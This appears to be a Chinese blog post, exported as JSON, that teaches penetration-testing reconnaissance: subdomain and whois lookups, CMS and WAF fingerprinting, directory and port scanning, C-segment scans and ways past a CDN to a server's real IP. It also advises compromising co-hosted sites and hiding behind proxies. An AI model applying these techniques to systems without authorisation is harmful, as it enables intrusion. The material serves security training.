顶级域名/一级域名：\n\n顶级域（或顶级域名，也称为一级域名），是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在http://www.example.com这个域名中，顶级域是.com。\n\n#### 二级域名：\n\n除了顶级域名，还有二级域名，就是最靠近顶级域名左侧的字段。例如在http://www.example.com这个域名中，example就是二级域名。\n\n#### 子域名：\n\n子域名，在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域.com的子域。凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。\n\n为什么要收集子域名\n\n子域名枚举可以在**测试范围**内发现更多的**域**或**子域**，这将**增大**漏洞发现的**几率**。\n\n有些**隐藏的**、**被忽略**的**子域**上运行的应用程序可能帮助我们发现**重大漏洞**。\n\n在同一个组织的不同域或应用程序中往往存在相同的漏洞\n\n假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其**主域**都是**重点防护区域**，所以不如**先进入目标的某个子域**，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。\n\n##### 利用在线工具查询\n网上有很多子域名的查询站点，可通过它们检索某个给定域名的子域名。如：\n\n- DNSdumpster：https://dnsdumpster.com/\n<br>\n- whois反查：http://whois.chinaz.com/\n<br>\n- virustotal：www.virustotal.com\n<br>\n- 子域名爆破：https://phpinfo.me/domain/\n<br>\n- IP反查绑定域名：http://dns.aizhan.com/\n<br> \n- https://hackertarget.com/\n<br> \n- find-dns-host-records/\n<br>\n- https://site.ip138.com\n\n\n##### 通过证书透明度公开日志枚举子域名\n证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。\n\n查找某个域名所属证书的最简单的方法就是使用搜索引擎来搜索一些公开的CT日志，例如以下网站：\n\ncrt.sh：https://crt.sh\ncensys：https://censys.io\n\n##### 子域名信息收集-聚合工具\n聚合工具就是，结合和爆破，证书，搜索引擎，DNS解析记录等多个方式去探测子域名比如：oneforall\n\nOneForAll(是一款集百家之长，功能强大的全面快速子域收集终极神器)\n\n###### 安装工具\noneforall\n下载好OneForAll，进入到OneForAll的目录下，执行以下命令安装OneForAll所需的环境依赖\n```\npython3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/\n```\n\n![oneforall](/images/信息收集/oneforall.png)\n\n```\npip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/\n```\n\n![oneforall](/images/信息收集/oneforall.png2)\n\nsubDomainBrute\n\nsubDomainsBrute是一款高并发的DNS暴力枚举工具\n\n下载完之后 进入目录安装依赖\n```\npip install dnspython gevent\n```\n\n![sub](/images/信息收集/submain.png)\n\n##### kali的工具\n在kali中的信息收集模块的DNS分析中，有很多工具可以进行域名信息收集\n\n- Dnsenum：域名信息收集\n- Dnsmap：收集信息和枚举DNS信息\n- Dnsrecon：用于DNS侦察\n- Fierce ：子域名查询\n\n##### windows的工具\nWindows上的子域名查询工具主要由：\n\nLayer子域名挖掘机\nsubDomainsbrute\nK8\nSublist3r\nMaltego\n\n### Whois 查询\nwhois 是用来查询域名的**IP**以及**所有者**等信息的传输协议。简单说，whois就是一个用来**查询域名**是否已经被注册，以及**注册域名**的**详细信息**的**数据库**（如域名所有人、域名注册商），不同域名后缀的Whois信息需要到**不同**的Whois数据库查询。通过whois来实现对域名信息的查询，可以得到注册人的**姓名**和邮**箱信息**通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。\n\n#### 在线工具\nhttps://whois.chinaz.com/\n\nhttps://mwhois.chinaz.com/  \n\nhttps://whois.aizhan.com/\n\nhttps://whois.aliyun.com/\n\nhttps://whois.cnnic.cn/WelcomeServlet\n\n#### 域名反查：\n\nhttps://mwhois.chinaz.com/\n\nhttps://whois.chinaz.com/\n\n\n#### icp备案查询：\n\nhttps://beian.mlit.gov.cn/\n\nhttps://icp.chinaz.com/\n\nhttps://beian88.com/\n\n\n\n\n\n\n\n#### 在线查询\n\n如今网上出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。\n\n常见的网站包括：\n\n- Whois站长之家查询：http://whois.chinaz.com/\n\n- 阿里云中国万网查询：https://whois.aliyun.com/\n\n- Whois Lookup 查找目标网站所有者的信息：http://whois.domaintools.com/\n\n- Netcraft Site Report 显示目标网站上使用的技术：http://toolbar.netcraft.com/site_report?url=\n\n- Robtex DNS 查询显示关于目标网站的全面的DNS信息：https://www.robtex.com/\n\n- 全球Whois查询：https://www.whois365.com/cn/\n\n- 站长工具爱站查询：https://whois.aizhan.com/\n\n还可以在Kali Linux下自带的Whois查询工具，通过命令Whois查询域名信息，只需输入要查询的域名即可\n\n#### 备案信息查询\n\n**网站备案信息**是根据**国家法律法规规定**，由**网站所有者**向国家**有关部门**申请的**备案**，是国家信息产业部对网站的一种管理途径，是为了防止在网上从事非法网站经营活动，当然主要是针对国内网站。\n\n在备案查询中我们主要关注的是：单位信息例如**名称**、**备案编号**、**网站负责人**、**法人**、**电子邮箱**、**联系电话**等。\n\n常用的备案信息查询网站有以下几个：\n\nICP/IP地址/域名信息备案管理系统：http://beian.miit.gov.cn/publish/query/indexFirst.action\n\nICP备案查询网：http://www.beianbeian.com/\n\n备案吧吧：https://www.beian88.com/\n\n天眼查：https://www.tianyancha.com/\n\n## 站点信息收集\n接下来进行web网站站点信息收集，主要收集如下信息：\n\n- CMS指纹识别\n- 历史漏洞\n- 脚本语言\n- 敏感目录/文件\n- Waf识别\n\n### CMS指纹识别\n**CMS**（**内容管理系统**）又称为**整站系统**或**文章系统**，用于**网站内容管理**。用户只需要下载对应的CMS软件包，就能**部署搭建**，并**直接利用**CMS。但是各种CMS都具有其**独特的结构命名规则**和**特定的文件内容**，因此可以利用这些内容来获取**CMS站点**的**具体软件CMS**与**版本**。\n\n指纹识别指的是通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别版本等等\n\n在渗透测试中，对进行指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。\n\n常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。\n\n（1）在线识别\n\n如今，网上一些在线的网站查询CMS指纹识别，如下所示：\n\n- 云悉：http://www.yunsee.cn/info.html\n- BugScaner: http://whatweb.bugscaner.com/look/\n- 潮汐指纹：http://finger.tidesec.net/\n- 云悉指纹: http://www.yunsee.cn/finger.html\n\n（2）利用工具\n\n常见的CMS指纹识别工具有**WhatWeb**、**WebRobo**、**椰树**、**御剑Web指纹识别**。大禹CMS识别程序等，可以快速识别一些主流CMS。\n\n当我们得知了一个站点的cms类型后，我们可以在网上查找与其相关的漏洞并进行相应的测试。\n\n（3）手工识别\n\n1. 根据HTTP响应头判断，重点关注**X-Powered-By**、**cookie**等字段\n2. 根据HTML 特征，重点关注 **body**、**title**、**meta**等标签的内容和属性。\n3. 根据特殊的t**class**判断。HTML 中存在特定 class 属性的某些 **div 标签**，如<body class=\"ke-content\">\n\n### 敏感目录/文件收集\n也就是对**目标网站**做个**目录扫描**。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的**后台管理页面**、**文件上传界面**、**robots.txt**，甚至可能扫描出**备份文件**从而得到网站的**源代码**。\n\n目录扫描可以让我们发现这个网站存在**多少个目录**，多少个**页面**，探索出网站的**整体结构**。通过目录扫描我们还能扫描**敏感文件**，**后台文件**，**数据库文件**，和**信息泄漏文件**等等\n\n#### 常见目录泄露\n**目录遍历漏洞**(程序在实现上没有**充分过滤**用户输入的../之类的**目录跳转符**，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。)\n\n\nrobots.txt          允许爬虫爬取的页面\n\nsitemap.xml     指导搜索引擎搜索哪些页面 列出了网站的所有重要页面，帮助搜索引擎更好地索引网页。\n\n网站的备份文件 / 数据\n\n后台登录的目录： /admin， /manage\n\n安装包（源码）列如：1.zip，非开源，商用\n\n上传的目录： 文件上传漏洞，  /upload，/upload.php\n\nphp探针(是用来监控服务器的工具，它可以显示服务器的运行状况，如硬盘使用、内存占用、网络流量、系统负载和当前时间等信息。)： phpinfo(，用于显示 PHP 配置和系统信息)，\n\n文本编辑器： kindeditor，CKeditor ， Ueditor，文件上传漏洞、命令注入(如果没有严格的验证和清理，攻击者可能利用这些编辑器进行文件上传攻击、命令注入或跨站脚本攻击（XSS）)\n\n\n#### 常见的网站目录的扫描工具主要有：\n\n- 御剑后台扫描工具\n- dirbuster扫描工具\n- dirsearch扫描工具\n- dirb\n- wwwscan\n- Sensitivefilescan\n\n### Waf识别\n**Web应用防护系统**（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对**HTTP/HTTPS**的安全策略来专门为Web应用提供保护的一款产品。\n\n#### waf介绍\nWAF分为**非嵌入型WAF和嵌入型WAF**，非嵌入型WAF指的是**硬件型WAF**、**云WAF**、**软件型WAF**之类的；而嵌入型WAF指的是网站**内置的WAF**\n\n非嵌入型WAF对Web流量的解析完全是**靠自身**，而嵌入型WAF拿到的Web数据是**已经被解析加工好的**。所以非嵌入型的受攻击机面还涉及到其他层面，\n\n而嵌入型WAF从Web容器模块型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强。\n\n#### wafoof\n**wafw00f**是一个Web应用防火墙（WAF）指纹识别的工具。\n\n##### 安装\n下载完之后 进入目录\n\n```\npython setup.py install\n```\n\n#### wafw00f的工作原理：\n\n1. 发送**正常**的**HTTP请求**，然后**分析响应**，这可以识别出很多WAF。\n\n2. 如果不成功，它会发送一些（可能是恶意的）HTTP请求，使用简单的**逻辑推断**是哪一个WAF。\n\n3. 如果这也不成功，它会分析之前返回的响应，使用**其它简单的算法猜测**是否有某个WAF或者安全解决方案响应了我们的攻击。\n\n\n### 敏感信息收集\n有时候，针对某些安全做得很好的目标，直接通过技术层面是无法完成渗透测试的。此时，便可以利用**搜索引擎搜索**目标**暴露在互联网上**的**关联信息**。例如：**数据库文件**、**SQL注入**、**服务配置信息**，甚至是通过Git找到**站点**泄露源代码，以及**Redis**等未授权访问、**Robots.txt**等敏感信息，从而达到渗透目的。\n\nGoogle hacking\n- **intext**：寻找正文中含有关键字的网页\n- **intitle**：寻找标题中含有关键字的网页\n- **allintitle**：用法和intitle类似，只不过可以指定多个词\n- **inurl**：搜索url中含有关键词的网页\n- **allinurl**：用法和inurl类似，只不过可以指定多个词\n- **site**：指定访问的站点\n- **filetype**：指定访问的文件类型\n- **link**：指定链接的网页\n- **related**：搜索相似类型的网页\n- **info**：返回站点的指定信息，例如：info:www.baidu.- com   将返回百度的一些信息\n- **phonebook**：电话簿查询美国街道地址和电话号码信息\n- **Index of**：利用 Index of 语法可以发现允许目录浏览的web网站，就像在本地的普通目录一样\n\n\n### Github信息泄露\nitHub作为开源代码平台，给程序员提供了很多便利，但如果使用不当，比如将包含了账号密码、密钥等配置文件的代码上传了，导致攻击者能发现并进一步利用这些泄露的信息，就是一个典型的GitHub敏感信息泄露漏洞，再如开发人员在开发时，常常会先把源码提交到github，最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息，\n\n## 旁站信息收集\n\n旁站是与攻击目标在同一服务器上的不同网站,在攻击目标没有漏洞的情况 下,可以通过查找旁站的漏洞攻击旁站,然后再通过提权拿到服务器的最高权限,拿到服务器的最高权限后攻击目标也就拿下了\n\n### 查询旁站的方式\n获取旁站一般有这个几个方式：\n\n1. 通过站长工具进行同IP的查询\n\nhttps://stool.chinaz.com/same\n\nhttps://chapangzhan.com/\n\nhttps://www.webscan.cc/\n\n2. 搜索引擎搜索\n\n3. 网络空间探测引擎搜索\n\n## c端主机查询\n\nC段查询主要是当前的IP攻击不下来的时候，可以攻击他的C段，比如IP是220.181.34.34是我们的目标，但是攻击不下来，可以去扫描220.181.34.0-255这个网段，看看能不能攻击下来\n\n对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器\n\n### nmap扫描c端主机\n```\nnmap -sn -ip/24\n```\n\n### 搜索引擎C段信息 \n使用google或者百度进行语法搜索 site:x.x.x.*进行C段的探测\n\n### c端扫描的工具扫描\n\n\n### 使用网络空间探测引擎 IP=\"XXX.XXX.XXX.0/24\"  \n\n### 存活资产探测\n\nC段+全段口会生成很多资产，但是其中会有不能访问的，所以我们需要资产探活。\n\n用EHole工具\n\n## 服务器信息收集\n我们还需要对目标服务器的信息进行收集，主要包括一下部分：\n\n- Web服务器指纹识别\n- 真实IP地址识别\n- 编程语言\n- Web中间件\n- 端口信息收集\n- 后端存储技术识别\n\nWeb服务器指纹识别\nWeb服务器指纹识别是了解正在运行的web服务器类型和版本，目前市场上存在几种不同的web服务器提供商和软件版本，了解被测试的web服务器的类型，能让测试者更好去测试已知漏洞和大概的利用方法，将会在渗透测试过程中有很大的帮助，甚至会改变测试的路线。\n\n### Web服务器指纹识别主要识别一下信息：\n\n1、Web服务器**名称**，**版本**\n\n2、Web服务器**后端**是否有**应用服务器**\n\n3、**数据库**(DBMS)是否**部署在同一主机(host)**，数据库类型\n\n4、Web应用使用的**编程语言**\n\n5、Web**应用框架**\n\n#### 手工检测\n\n1. HTTP头分析\n即查看HTTP响应头中的**Server**、**X-Powered-By**、**Cookie** 等字段，这也是最基本的方法。\n\n2. 2. 协议行为\n即从**HTTP头字段顺序分析**，观察HTTP响应头的**组织顺序**，因为每个服务器都有一个内部的H**TTP头排序**方法。\n\n3. 浏览并观察网站\n我们可以观察网站某些位置的**HTML源码**(**特殊的class名称**)及其**注释(comment)部分**，可能暴露有价值信息。观察**网站页面后缀**可以判断Web应用使用的编程语言和框架。\n\n4. 刻意构造错误\n错误页面可以给你提供关于服务器的大量信息。可以通过构造含有随机字符串的URL，并访问它来尝试得到404页面。\n\n\n#### 利用工具识别\n\n**whatweb**是一款用于辅助的自动化Web应用指纹分析工具\n\n## 真实IP地址识别\n\n我们平时使用浏览器，使用的都是**域名**，域名的存在是为了方便人的记忆，其实浏览器本质还是**访问真实IP地址**来获取页面的。\n\n在渗透测试中，一般只会给你一个域名，那么我们就要根据这个域名来确定目标服务器的真实IP，我们可以通过像www.ip138.com这样的IP查询网直接获取目标的一些IP及域名信息，但这里的前提是目标服务器**没有使用CDN**\n\n找到真实的IP我们就可以访问这个IP的C段和端口，方便进一步渗透，\n\n### 什么是CDN\n\nCDN的全称是Content Delivery Network，即**内容分发网络**。企业利用分布在**不同区域**的**节点服务器群组**成流量分配**管理平台**，为用户提供内容**分散存储**和**高速缓存服务**\n\n### CDN的优势\n1. 提高用户访问速率，优化用户使用体验\n\n2. 隐藏真实服务器的IP\n\n3. 提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。\n\n### CDN几种访问方式的不同\n\n1. 传统访问：用户访问域名–>解析服务器IP–>访问目标主机\n2. 普通CDN：用户访问域名–>CDN节点–>真实服务器IP–>访问目标主机\n3. 带WAF的CDN：用户访问域名–>CDN节点（云WAF）–>真实服务器IP–>访问目标主机\n\n我们也可以**设置代理**或者通过在线ping网站来在不同地区进行ping测试，然后对比每个地区ping出的IP结果，查看这些IP是否一致，**一致**，则极有可能**不存在CDN**。根据 CDN 的工作原理，如果网站使用了 CDN，那么从**全国各地访问网站**的 IP 地址是**各个 CDN 节点的 IP 地址**，那么如果ping出来的IP**大多不太一样**或者**规律性很强**，可以尝试查询这些IP的归属地，判断是否存在CDN。有以下网站可以进行ping测试：\n```\n http://ping.chinaz.com/\n https://www.wepcc.com\n https://www.17ce.com\n```\n\nSearchMap判断目标有没有使用CDN\n\nsearchmap是一款集域名解析、IP反查域名、WHOIS查询、CDN检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具\n\n### 如何绕过CDN找到目标真实IP？\n\n1. 利用子域名。一般来说很多站长可能只会对主站或者流量较大的分站使用CDN，但是一些流量比较小的分站可能没有挂CDN，这些分站和主站虽然不是同一个IP但是都在同一个C段下面的情况，所以我们可以通过ping二级域名获取分站lP，从而能判断出目标的真实IP段。\n<br>\n2. 查询主域。以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不使用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了\n<br>\n3. 扫描网站敏感文件，如phpinfo.php等，从而找到目标的真实IP。\n<br>\n4. 从国外访问。国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实P。我们可以通过国外在线代理网站访问，可能会得到真实的IP地址，\n    ```\n    http://host-tracker.com/\n\n    http://www.webpagetest.org/\n\n    https://asm.ca.com/en/ping.php\n\n    ```\n5. 查看域名历史解析记录。也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过\n   ```\n   https://dnsdb.io/zh-cn/\n\n    https://x.threatbook.cn\n\n    https://viewdns.info/iphistory/\n\n    https://site.ip138.com/\n    \n    https://www.netcraft.com\n\n    https://viewdns.info/\n    ```\n等网站来观察域名的IP历史记录。\n\n6. Nslookup查询。查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n\n7.  利用网络空间搜索引擎。这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。最常见的网络空间搜索引擎有如下：\n\n- Shodan：https://www.shodan.io/\n- 钟馗之眼：https://www.zoomeye.org/\n- FOFA：https://fofa.so/\n\n8. 利用网站漏洞。比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。\n\n## 端口信息收集\n查看本机端口\n\nnetstat命令\n\n1. nmap工具加Zenmap工具加Masscan工具扫描\n   zenmap是nmap的图形化界面\n   masscan高速端口扫描工具\n\n2. 由于使用工具通常会在目标网站留下痕迹，接下来提供一种在线网站探测方法。\n\n- 在线网站：http://tool.chinaz.com/port/\n- ThreatScan在线网站（网站基础信息收集）：https://scan.top15.cn/\n- Shodan：https://www.shodan.io/\n\n\n## 主动信息收集\n\n主动信息收集通常是在被动信息收集之后分析出重要攻击⾯或者⽬标重要信息的时候再针对性地去做主动信息收集，\n\n在主动信息收集的时候通常持续时间⽐较⻓⽽且会通过各种不同的⽅式与⽬标交互。实战中最常⽤的⼿段是模拟或者伪装正常的业务流程与⽬标交互。\n\n主动信息搜集之前我们一定要挂上代理，一方面是为了隐藏自己，一方面是为了防止测试的时候被封ip导致无法进行继续的渗透活动。\n\n### 操作系统识别\nWindows的TTL的值是128，而Linux的TTL大多是64。（默认情况下）\n\n### 服务版本识别\n流量包中的关键字\n\nservers-db（nmap所维护的一个数据库，其中包含了各种网络服务的版本信息的特征数据，通过对目标服务发起请求，从响应中提取特征数据跟数据库中进行比对，就能识别出对应的版本）\n\n\n\n\n\n# 参考\n\nhttps://blog.csdn.net/qq_64177395/article/details/141267567\n\nhttps://www.cnblogs.com/0daybug/p/13800776.html","slug":"信息收集","published":1,"updated":"2025-02-01T11:03:54.009Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxo001ktsg64vpteayh","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>信息收集的重要性毋庸置疑 古今中外 生活的每个部分都离不开信息收集 强大的信息收集能力是制胜关键。渗透测试也不例外 有句话说得好 渗透测试的本质就是信息收集 </p>\n<p>信息收集通常分为</p>\n<ul>\n<li><p>域名信息收集</p>\n</li>\n<li><p>子域名信息收集</p>\n</li>\n<li><p>站点信息收集</p>\n</li>\n<li><p>旁站信息收集</p>\n</li>\n<li><p>c端主机查询</p>\n</li>\n<li><p>敏感信息收集</p>\n</li>\n<li><p>服务器信息收集</p>\n</li>\n<li><p>端口信息收集</p>\n</li>\n<li><p>真实IP地址识别</p>\n</li>\n<li><p>主动信息收集</p>\n</li>\n</ul>\n<h2 id=\"域名信息收集\"><a href=\"#域名信息收集\" class=\"headerlink\" title=\"域名信息收集\"></a>域名信息收集</h2><p>域名信息收集<br><strong>域名</strong>（英语：Domain Name），又称<strong>网域</strong>，是由一串用<strong>点分隔</strong>的名字组成的Internet上某<strong>一台计算机</strong>或<strong>计算机组</strong>的名称，用于在数据传输时对计算机的<strong>定位标识</strong>（有时也指地理位置）。由于IP地址具有<strong>不方便记忆</strong>并且<strong>不能显示地址组织</strong>的<strong>名称</strong>和<strong>性质</strong>等缺点，人们设计出了域名，并通过dns(Domain Name System)网域名称系统来将域名和IP地址<strong>相互映射</strong>，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p>\n<h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><h4 id=\"顶级域名-一级域名：\"><a href=\"#顶级域名-一级域名：\" class=\"headerlink\" title=\"顶级域名&#x2F;一级域名：\"></a>顶级域名&#x2F;一级域名：</h4><p>顶级域（或顶级域名，也称为一级域名），是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在<a href=\"http://www.example.com这个域名中,顶级域是.com./\">http://www.example.com这个域名中，顶级域是.com。</a></p>\n<h4 id=\"二级域名：\"><a href=\"#二级域名：\" class=\"headerlink\" title=\"二级域名：\"></a>二级域名：</h4><p>除了顶级域名，还有二级域名，就是最靠近顶级域名左侧的字段。例如在<a href=\"http://www.example.com这个域名中,example就是二级域名./\">http://www.example.com这个域名中，example就是二级域名。</a></p>\n<h4 id=\"子域名：\"><a href=\"#子域名：\" class=\"headerlink\" title=\"子域名：\"></a>子域名：</h4><p>子域名，在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域.com的子域。凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。</p>\n<p>为什么要收集子域名</p>\n<p>子域名枚举可以在<strong>测试范围</strong>内发现更多的<strong>域</strong>或<strong>子域</strong>，这将<strong>增大</strong>漏洞发现的<strong>几率</strong>。</p>\n<p>有些<strong>隐藏的</strong>、<strong>被忽略</strong>的<strong>子域</strong>上运行的应用程序可能帮助我们发现<strong>重大漏洞</strong>。</p>\n<p>在同一个组织的不同域或应用程序中往往存在相同的漏洞</p>\n<p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其<strong>主域</strong>都是<strong>重点防护区域</strong>，所以不如<strong>先进入目标的某个子域</strong>，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。</p>\n<h5 id=\"利用在线工具查询\"><a href=\"#利用在线工具查询\" class=\"headerlink\" title=\"利用在线工具查询\"></a>利用在线工具查询</h5><p>网上有很多子域名的查询站点，可通过它们检索某个给定域名的子域名。如：</p>\n<ul>\n<li>DNSdumpster：<a href=\"https://dnsdumpster.com/\">https://dnsdumpster.com/</a><br></li>\n<li>whois反查：<a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a><br></li>\n<li>virustotal：<a href=\"http://www.virustotal.com/\">www.virustotal.com</a><br></li>\n<li>子域名爆破：<a href=\"https://phpinfo.me/domain/\">https://phpinfo.me/domain/</a><br></li>\n<li>IP反查绑定域名：<a href=\"http://dns.aizhan.com/\">http://dns.aizhan.com/</a><br> </li>\n<li><a href=\"https://hackertarget.com/\">https://hackertarget.com/</a><br> </li>\n<li>find-dns-host-records&#x2F;<br></li>\n<li><a href=\"https://site.ip138.com/\">https://site.ip138.com</a></li>\n</ul>\n<h5 id=\"通过证书透明度公开日志枚举子域名\"><a href=\"#通过证书透明度公开日志枚举子域名\" class=\"headerlink\" title=\"通过证书透明度公开日志枚举子域名\"></a>通过证书透明度公开日志枚举子域名</h5><p>证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。</p>\n<p>查找某个域名所属证书的最简单的方法就是使用搜索引擎来搜索一些公开的CT日志，例如以下网站：</p>\n<p>crt.sh：<a href=\"https://crt.sh/\">https://crt.sh</a><br>censys：<a href=\"https://censys.io/\">https://censys.io</a></p>\n<h5 id=\"子域名信息收集-聚合工具\"><a href=\"#子域名信息收集-聚合工具\" class=\"headerlink\" title=\"子域名信息收集-聚合工具\"></a>子域名信息收集-聚合工具</h5><p>聚合工具就是，结合和爆破，证书，搜索引擎，DNS解析记录等多个方式去探测子域名比如：oneforall</p>\n<p>OneForAll(是一款集百家之长，功能强大的全面快速子域收集终极神器)</p>\n<h6 id=\"安装工具\"><a href=\"#安装工具\" class=\"headerlink\" title=\"安装工具\"></a>安装工具</h6><p>oneforall<br>下载好OneForAll，进入到OneForAll的目录下，执行以下命令安装OneForAll所需的环境依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/oneforall.png\" alt=\"oneforall\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/oneforall.png2\" alt=\"oneforall\"></p>\n<p>subDomainBrute</p>\n<p>subDomainsBrute是一款高并发的DNS暴力枚举工具</p>\n<p>下载完之后 进入目录安装依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install dnspython gevent</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/submain.png\" alt=\"sub\"></p>\n<h5 id=\"kali的工具\"><a href=\"#kali的工具\" class=\"headerlink\" title=\"kali的工具\"></a>kali的工具</h5><p>在kali中的信息收集模块的DNS分析中，有很多工具可以进行域名信息收集</p>\n<ul>\n<li>Dnsenum：域名信息收集</li>\n<li>Dnsmap：收集信息和枚举DNS信息</li>\n<li>Dnsrecon：用于DNS侦察</li>\n<li>Fierce ：子域名查询</li>\n</ul>\n<h5 id=\"windows的工具\"><a href=\"#windows的工具\" class=\"headerlink\" title=\"windows的工具\"></a>windows的工具</h5><p>Windows上的子域名查询工具主要由：</p>\n<p>Layer子域名挖掘机<br>subDomainsbrute<br>K8<br>Sublist3r<br>Maltego</p>\n<h3 id=\"Whois-查询\"><a href=\"#Whois-查询\" class=\"headerlink\" title=\"Whois 查询\"></a>Whois 查询</h3><p>whois 是用来查询域名的<strong>IP</strong>以及<strong>所有者</strong>等信息的传输协议。简单说，whois就是一个用来<strong>查询域名</strong>是否已经被注册，以及<strong>注册域名</strong>的<strong>详细信息</strong>的<strong>数据库</strong>（如域名所有人、域名注册商），不同域名后缀的Whois信息需要到<strong>不同</strong>的Whois数据库查询。通过whois来实现对域名信息的查询，可以得到注册人的<strong>姓名</strong>和邮<strong>箱信息</strong>通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。</p>\n<h4 id=\"在线工具\"><a href=\"#在线工具\" class=\"headerlink\" title=\"在线工具\"></a>在线工具</h4><p><a href=\"https://whois.chinaz.com/\">https://whois.chinaz.com/</a></p>\n<p><a href=\"https://mwhois.chinaz.com/\">https://mwhois.chinaz.com/</a>  </p>\n<p><a href=\"https://whois.aizhan.com/\">https://whois.aizhan.com/</a></p>\n<p><a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a></p>\n<p><a href=\"https://whois.cnnic.cn/WelcomeServlet\">https://whois.cnnic.cn/WelcomeServlet</a></p>\n<h4 id=\"域名反查：\"><a href=\"#域名反查：\" class=\"headerlink\" title=\"域名反查：\"></a>域名反查：</h4><p><a href=\"https://mwhois.chinaz.com/\">https://mwhois.chinaz.com/</a></p>\n<p><a href=\"https://whois.chinaz.com/\">https://whois.chinaz.com/</a></p>\n<h4 id=\"icp备案查询：\"><a href=\"#icp备案查询：\" class=\"headerlink\" title=\"icp备案查询：\"></a>icp备案查询：</h4><p><a href=\"https://beian.mlit.gov.cn/\">https://beian.mlit.gov.cn/</a></p>\n<p><a href=\"https://icp.chinaz.com/\">https://icp.chinaz.com/</a></p>\n<p><a href=\"https://beian88.com/\">https://beian88.com/</a></p>\n<h4 id=\"在线查询\"><a href=\"#在线查询\" 